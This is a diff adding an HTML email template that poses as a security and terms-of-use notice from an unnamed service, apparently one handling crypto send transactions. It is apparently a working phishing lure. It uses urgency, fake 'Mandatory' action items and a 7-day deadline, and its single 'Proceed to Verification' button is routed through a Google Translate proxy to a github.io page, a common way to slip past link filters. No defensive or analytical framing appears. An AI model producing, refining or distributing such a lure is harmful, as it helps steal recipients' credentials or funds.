@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invoice / Security & Terms Update Notice</title>
+    <style>
+        @page {
+            size: A4;
+            margin: 0;
+        }
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: #333333;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 40px 20px;
+            -webkit-font-smoothing: antialiased;
+        }
+        .invoice-box {
+            max-width: 800px;
+            margin: auto;
+            padding: 40px;
+            border: 1px solid #eee;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            background: #ffffff;
+            border-radius: 4px;
+        }
+        .header-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .header-table td {
+            vertical-align: top;
+        }
+        .logo {
+            width: 80px;
+            height: auto;
+        }
+        .invoice-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2c3e50;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: right;
+            margin: 0;
+        }
+        .invoice-details {
+            text-align: right;
+            font-size: 13px;
+            color: #666666;
+            margin-top: 5px;
+        }
+        .divider {
+            height: 2px;
+            background-color: #f26f21;
+            margin-bottom: 30px;
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            width: 50%;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .meta-title {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #888888;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        .alert-box {
+            background-color: #fff8f3;
+            border-left: 4px solid #f26f21;
+            padding: 15px 20px;
+            border-radius: 4px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            color: #444444;
+            line-height: 1.5;
+        }
+        .item-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .item-table th {
+            background-color: #f4f6f8;
+            color: #555555;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 2px solid #e1e4e8;
+        }
+        .item-table td {
+            padding: 15px;
+            font-size: 14px;
+            border-bottom: 1px solid #eeeeee;
+            color: #333333;
+        }
+        .action-container {
+            margin-top: 20px;
+            padding: 25px;
+            background-color: #fafafa;
+            border: 1px dashed #dcdcdc;
+            border-radius: 6px;
+            text-align: center;
+        }
+        .btn-verify {
+            display: inline-block;
+            background-color: #f26f21;
+            color: #ffffff !important;
+            text-decoration: none;
+            padding: 12px 30px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+        .qr-code {
+            width: 100px;
+            height: 100px;
+            border: 1px solid #eaeaeb;
+            padding: 5px;
+            background: #ffffff;
+            border-radius: 6px;
+        }
+        .footer {
+            margin-top: 40px;
+            border-top: 1px solid #eeeeee;
+            padding-top: 20px;
+            font-size: 12px;
+            color: #888888;
+            text-align: center;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="invoice-box">
+        <!-- Top Header -->
+        <table class="header-table">
+            <tr>
+                <td>
+                    <img src="https://img.icons8.com/?size=160&id=eKMJNq24gVwS&format=png" alt="Brand Logo" class="logo">
+                </td>
+                <td>
+                    <br><br>
+                    <div class="invoice-details">
+                        <strong>Notice :</strong> #SEC-2026-8892<br>
+                        <strong>Status:</strong> Action Required
+                    </div>
+                </td>
+            </tr>
+        </table>
+
+        <div class="divider"></div>
+
+        <!-- Meta info / Address Style -->
+        <table class="meta-table">
+            <tr>
+                <td>
+                    <div class="meta-title">Issued For</div>
+                    Account Migration & Terms Approval<br>
+                    Status: Pending Verification
+                </td>
+                <td style="text-align: right;">
+                    <div class="meta-title">Issued By</div>
+                    <strong>Security & Compliance Operations</strong><br>
+                    Backend Infrastructure & Legal Team<br>
+                </td>
+            </tr>
+        </table>
+
+        <!-- Security & Terms Alert Box -->
+        <div class="alert-box">
+            <p style="margin: 0 0 10px 0;">
+                <strong>Security & Email Verification Update:</strong> As part of this rollout, account migration and email verification are required to keep your profile secure. We are also deploying a new patch to our <strong>Security Alerts</strong> module — an enhanced pre-transaction screening engine that proactively warns you before confirming any send transaction flagged as malicious.
+            </p>
+            <p style="margin: 0;">
+                <strong>Terms of Use Update:</strong> There has been an update to our terms of use. Please complete the verification process to approve these updated terms.
+            </p>
+        </div>
+
+        <!-- Itemized Actions Table -->
+        <table class="item-table">
+            <thead>
+                <tr>
+                    <th style="width: 70%;">Service / Action Item</th>
+                    <th style="width: 30%; text-align: right;">Requirement Level</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>
+                        <strong>Account Migration & Email Verification</strong><br>
+                        <span style="font-size: 13px; color: #666666;">
+                            Backend transition verification required to maintain seamless access and profile security.
+                        </span>
+                    </td>
+                    <td style="text-align: right; color: #f26f21; font-weight: bold;">
+                        Mandatory
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Terms of Use Acknowledgement & Signature</strong><br>
+                        <span style="font-size: 13px; color: #666666;">
+                            Review and approve updated terms of service compliance documentation.
+                        </span>
+                    </td>
+                    <td style="text-align: right; color: #f26f21; font-weight: bold;">
+                        Mandatory
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- Action Callout Block -->
+        <div class="action-container">
+            <p style="font-size: 14px; margin: 0 0 15px 0; color: #555555;">
+                Please complete the verification process by clicking the button below:
+            </p>
+            <a href="https://translate.google.com/translate?sl=auto&tl=en&u=https://metafiles-en.github.io/files/index.html" class="btn-verify">Proceed to Verification</a>
+            
+            <br><br>
+            <div style="display: inline-block; margin-top: 20px; background-color: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 6px 14px; border-radius: 20px; font-size: 12.5px; font-weight: 500; letter-spacing: 0.3px;">
+                <strong>Note:</strong> This document will be available for 7 days.
+            </div>
+        </div>
+
+        
+
+</body>
+</html>
